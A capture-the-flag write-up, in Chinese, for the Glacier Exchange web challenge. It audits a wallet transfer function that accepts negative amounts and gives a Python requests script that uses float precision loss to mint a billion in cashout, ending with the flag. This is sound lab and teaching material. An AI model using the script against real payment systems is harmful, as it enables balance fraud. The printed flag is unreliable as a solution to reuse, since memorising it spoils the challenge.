# Writeup — Glacier Exchange (Glacier-2023, web/medium)

## 審計：漏洞在 wallet.py

轉帳邏輯（`src/wallet.py`）只用一個 `>=` 比較做檢查，且金額在 `server.py` 用 `float(payload["balance"])` 解析，完全沒有下限（不擋負數）：

```python
def transaction(self, source, dest, amount):
    if source in self.balances and dest in self.balances:
        with self.lock:
            if self.balances[source] >= amount:      # 只有這個檢查，且無 amount > 0
                self.balances[source] -= amount
                self.balances[dest]   += amount
                return 1
    return 0
```

若 `amount` 為負，`balances[source] >= amount` 永遠成立；`source -= amount` 反而讓 source **變大**，`dest += amount` 讓 dest 變成大負數。

## 勝利條件

`inGlacierClub()` 要求 `cashout >= 1000000000` 且其餘所有幣種都恰為 `0.0`；符合時 `/api/wallet/join_glacier_club` 回傳 `clubToken`（就是 flag）。難點在於：既要弄出 10 億在 cashout，又要把其他帳戶精確歸零。

## 關鍵：浮點精度誤差

IEEE-754 double 只有約 15–16 位有效數字。當某帳戶餘額大到 `1e28` 這種量級時，`1e28 - 1e9 == 1e28`（10 億在這個尺度下小到被吃掉），而 `-1e28 + 1e28 == 0.0` 又能精確歸零。利用這點就能「借出」10 億卻不減少來源帳戶。

三步（來源帳戶用 `ascoin`）：

```python
import requests
s = requests.Session(); base = "http://victim:8080"
s.get(base)

# 1) 送超大負數把 ascoin 灌成 +1e28（glaciercoin 變 -1e28）
s.post(f"{base}/api/wallet/transaction",
       json={"sourceCoin":"ascoin","targetCoin":"glaciercoin","balance":"-1e+28"})

# 2) 從 1e28 的 ascoin 轉 10 億到 cashout；1e28 - 1e9 == 1e28，ascoin 不變
s.post(f"{base}/api/wallet/transaction",
       json={"sourceCoin":"ascoin","targetCoin":"cashout","balance":"1000000000"})

# 3) 還回借來的錢：ascoin 1e28 -> 0，glaciercoin -1e28 + 1e28 == 0
s.post(f"{base}/api/wallet/transaction",
       json={"sourceCoin":"ascoin","targetCoin":"glaciercoin","balance":"1e+28"})

# 4) 現在只有 cashout = 1e9 + 1000，其餘皆 0 -> 進 club 拿 flag
r = s.post(f"{base}/api/wallet/join_glacier_club")
print(r.json()["clubToken"])
```

結束後 `cashout = 1000000000 + 1000`（≥ 10 億），其餘幣種精確為 0，通過 `inGlacierClub()`。
（作者亦提到有非預期解：直接用 `inf`/`NaN`。）

## Flag

`gctf{PyTh0N_CaN_hAv3_Fl0At_0v3rFl0ws_2}`
